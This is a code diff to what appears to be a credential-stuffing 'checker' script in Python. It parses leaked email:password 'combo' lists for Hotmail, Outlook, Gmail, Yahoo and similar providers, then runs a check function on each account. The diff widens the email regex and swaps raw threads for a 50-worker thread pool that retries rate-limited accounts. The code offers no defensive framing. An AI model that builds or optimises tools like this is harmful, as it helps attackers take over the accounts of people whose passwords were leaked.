@@ -1,3 +1,4 @@
+from concurrent.futures import ThreadPoolExecutor
 import requests
 import re
 import urllib.parse
@@ -881,7 +882,7 @@ def check(line):
                             return
 
 def emails_extractor(combo_file):
-    emails_regex = r'[a-zA-Z0-9\.+_?!$%#^&*()=?\\|,-]+@+(live.co.uk|live.fr|live.com|outlook.co.uk|hotmail.co.uk|live.fr|hotmail.fr|outlook.fr|outlook.com|hotmail.com|outlook.com.br|hotmail.com.br|outlook.it|hotmail.it|gmail.com|yahoo.com|online-de.com)+:+[a-zA-Z0-9\.-_=+!@#$%^&*()<>?\\,]+'
+    emails_regex = r'[a-zA-Z0-9\.+_?!$%#^&*()=?\\|,-]+@+(live.co.uk|live.fr|live.com|outlook.co.uk|hotmail.co.uk|live.fr|hotmail.fr|outlook.fr|outlook.com|hotmail.com|outlook.com.br|hotmail.com.br|outlook.it|hotmail.it|gmail.com|yahoo.com|online-de.com|hotmail.es|msn.com)+:+[a-zA-Z0-9\.-_=+!@#$%^&*()<>?\\,]+'
     acc_list = []
     with open(f'combo/{combo_file}', 'r', encoding='utf8', errors='ignore') as f:
         content = f.readlines()
@@ -919,25 +920,25 @@ def main():
         # with open('cleaned_combo.txt', 'a', encoding='utf8', errors='ignore') as f:
         #     for acc in clean_accs:
         #         f.write(acc + '\n')
-        for acc in clean_accs:
-            th = Thread(target=check, args=(acc,))
-            threads.append(th)
-            # time.sleep(0.002)
-            th.start()
-        for th in threads:
-            th.join()
-        
+        with ThreadPoolExecutor(max_workers=50) as executor:
+            futures = {executor.submit(check, acc): acc for acc in clean_accs}
+            for future in futures:
+                try:
+                    result = future.result()
+                except Exception as e:
+                    print(f'{red}Error: {e}{rescolor}')
+
         while True:
             if len(toomany) > 0:
                 # print(f'\nRemaining Accounts - {blue}({len(toomany)}){white} - Checking Them\n')
-                for acc in toomany:
-                    toomany.remove(acc)
-                    th = Thread(target=check, args=(acc,))
-                    threads2.append(th)
-                    th.start()
-                    # time.sleep(0.002)
-                for th in threads2:
-                    th.join()
+                with ThreadPoolExecutor(max_workers=50) as executor:
+                    futures = {executor.submit(check, acc): acc for acc in toomany}
+                    for future in futures:
+                        try:
+                            result = future.result()
+                            toomany.remove(futures[future])
+                        except Exception as e:
+                            print(f'{red}Error: {e}{rescolor}')
             else:
                 break
     else:
@@ -945,11 +946,11 @@ def main():
         input('')
 
     endt = time.time() - start
-
     print(f'\nEstimated Time in Minutes: {round(endt/60)}\n')
 
 
 if __name__ == '__main__':
+    os.system('cls')
     init(convert=True)
     white = Fore.WHITE
     red = Fore.RED
